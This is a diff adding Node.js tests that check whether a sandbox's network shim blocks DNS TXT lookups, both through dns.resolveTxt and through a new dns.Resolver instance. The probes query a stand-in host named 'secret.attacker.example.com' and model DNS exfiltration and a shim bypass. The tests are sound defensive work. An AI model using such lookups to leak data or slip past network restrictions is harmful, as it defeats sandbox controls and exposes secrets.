@@ -54,6 +54,34 @@ try {
   assert.match(out, /\bOK\b/, `dns.promises.resolve was not blocked: ${out}`)
 })
 
+test("dns.resolveTxt is blocked (TXT is a classic exfil channel)", () => {
+  const out = runProbe(`
+import dns from "node:dns"
+dns.resolveTxt("secret.attacker.example.com", (err) => {
+  if (err && /Outbound network access disabled/.test(err.message)) console.log("OK")
+  else console.log("FAIL:" + (err ? err.message : "no error"))
+})
+`)
+  assert.match(out, /\bOK\b/, `dns.resolveTxt was not blocked: ${out}`)
+})
+
+test("a new dns.Resolver() instance is also blocked (no prototype bypass)", () => {
+  const out = runProbe(`
+import dns from "node:dns"
+const r = new dns.Resolver()
+try {
+  await new Promise((resolve, reject) =>
+    r.resolveTxt("secret.attacker.example.com", (err) => (err ? reject(err) : resolve())),
+  )
+  console.log("FAIL:no error")
+} catch (err) {
+  if (/Outbound network access disabled/.test(err.message)) console.log("OK")
+  else console.log("FAIL:" + err.message)
+}
+`)
+  assert.match(out, /\bOK\b/, `dns.Resolver instance bypassed the shim: ${out}`)
+})
+
 test("net.Socket.connect remains blocked (existing shim still intact)", () => {
   const out = runProbe(`
 import net from "node:net"
